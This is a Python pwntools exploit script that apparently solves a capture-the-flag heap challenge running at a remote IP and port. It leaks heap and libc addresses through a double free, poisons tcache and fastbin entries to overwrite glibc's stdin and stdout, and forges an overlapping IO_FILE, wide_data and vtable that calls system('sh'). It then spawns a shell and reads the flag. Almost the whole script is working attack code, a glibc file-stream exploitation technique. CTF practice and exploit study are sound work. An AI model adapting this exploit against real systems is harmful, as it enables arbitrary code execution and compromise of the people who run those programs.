#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './a.out_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-l", "175"]
host, port = '103.174.115.12', 7000

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# Arch:     amd64
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# RUNPATH:    b'.'
# Stripped:   No

def alloc(idx, content):
    io.sendlineafter(b':', b'1')
    io.sendlineafter(b':', str(idx).encode())
    io.send(content)

def free(idx):
    io.sendlineafter(b':', b'3')
    io.sendlineafter(b':', str(idx).encode())

def view(idx):
    io.sendlineafter(b':', b'4')
    io.sendlineafter(b':', str(idx).encode())

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def consume_tcache():
    for i in range(7):
        alloc(i, str(i).encode()+b'\n')

def exploit():
    global io
    heap = 0x0
    io = initialize()

    for i in range(10):
        alloc(i, str(i).encode())
    for i in range(12):
        alloc(9, b'9')
    for i in range(7):
        free(i)
    free(7)
    free(8)
    free(7)

    view(7)
    io.recv(1)
    heap = u64(io.recv(6).ljust(8, b'\x00'))
    heap = demangle(heap)-0x510

    # consume tcache
    for i in range(7):
        alloc(i, b'\x00'*0x30 + p64(mangle(heap, 0x0))) # fix fastbin/tcache linking

    alloc(7, p64(mangle(heap, heap+0x4c0-0x10)))
    alloc(8, b'8')
    alloc(8, b'8')
    alloc(9, p64(0x0)*3 + p64(0x461))

    free(8)
    view(8)
    io.recv(1)
    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x210b20
    stdout = libc.sym['_IO_2_1_stdout_']
    stdin = libc.sym['_IO_2_1_stdin_']

    # cleanup unsorted bin
    for i in range(14):
        alloc(9, b'9')

    for i in range(10):
        alloc(i, str(i).encode())
    for i in range(7):
        free(i)
    free(7)
    free(8)
    free(7)

    consume_tcache()
    alloc(7, p64(mangle(heap, stdin+0x30)))
    alloc(8, b'8')
    alloc(8, b'8')
    alloc(9, flat([
        stdout,
        stdout,
        stdout+0x300,
    ]))

    fp = stdout
    # crafting overlapping IO_FILE, wide_data and wide_vtable
    overlap = b'  sh\x00\x00\x00\x00' # [FILE] _flags | [WIDE DATA] read_ptr
    overlap += flat([
        p64(0x0),               # [WIDE DATA] read_end
        p64(0x0),               # [WIDE DATA] read_base
        p64(0x0),               # [WIDE DATA] write_base
        p64(0x0),               # [WIDE DATA] write_ptr
        p64(0x0),               # [WIDE DATA] write_end
        p64(0x0),               # [WIDE DATA] buf_base
        p64(0x0),               # [WIDE DATA] buf_end 
        p64(0x0),               # [WIDE DATA] save_base
        p64(0x0),               # [WIDE DATA] backup_base 
        p64(0x0),               # [WIDE DATA] save_end
    ])
    overlap += b'\x00' * 8       # [WIDE DATA] state
    overlap += b'\x00' * 8       # [WIDE DATA] last_state

    codecvt = b''
    codecvt += p64(libc.sym['system'])     # [FILE] _chain | [WIDE DATA] codecvt | [VTABLE] __doallocate (at function authenticate, skips the puts because we overwrote stdout)
    codecvt += b'\x00' * 0x18                   # padding
    codecvt += p64(fp - 0x10)                   # [FILE] _lock
    codecvt += p64(0x0) * 2                     # padding
    codecvt += p64(fp+0x8)                      # [FILE] _wide_data
    codecvt += b'\x00' * (0x18 + 4 + 20)        # padding
    codecvt += p64(libc.sym['_IO_wfile_jumps']) # [FILE] vtable
    codecvt += b'\x00' * (0x70 - len(codecvt))  # padding
    
    overlap += codecvt
    overlap += p64(0x0)                         # [WIDE DATA] wchar_t shortbuf[1] (alligned to 8 bytes)
    overlap += p64(fp)                          # [WIDE DATA] vtable

    io.sendline(overlap)

    io.sendline(b'cat flag*')

    log.info("heap: %#x", heap)
    log.info("libc: %#x", libc.address)
    log.info("stdin: %#x", stdin)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
